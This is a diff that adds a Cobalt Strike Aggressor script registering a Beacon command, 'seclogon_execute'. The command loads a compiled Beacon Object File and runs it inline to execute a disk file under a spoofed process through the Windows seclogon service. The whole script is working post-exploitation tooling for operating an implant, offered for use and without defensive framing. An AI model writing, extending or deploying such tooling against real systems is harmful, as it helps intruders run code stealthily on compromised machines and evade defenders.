@@ -1,0 +1,34 @@
+#seclogon execute Bof
+#author @BambiZombie
+
+#register help
+beacon_command_register("seclogon_execute", "Execute a disk file with seclogon spoof.",
+	"Synopsis: seclogon_execute <pid> <exe_file>\n" .
+	"Bof implementation of the MalSecLogonSpoof.\n");
+
+alias seclogon_execute {
+    $bid = $1;
+
+    $pid = @_[1];
+    $cmdline = @_[2];
+
+    if (!-isnumber $pid || $pid eq "1") {
+		berror($bid, "Please specify a process to spoof.");
+		  return;
+    }
+
+    if ($cmdline eq "") {
+		berror($bid, "Please specify a disk file to execute.");
+		  return;
+    }
+    
+    # Read in the right BOF file
+    $handle = openf(script_resource("seclogon_execute." . barch($bid) . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    # Pack our arguments
+    $arg_data  = bof_pack($bid, "iZ", $pid, $cmdline);
+	
+    beacon_inline_execute($bid, $data, "go", $arg_data);
+}
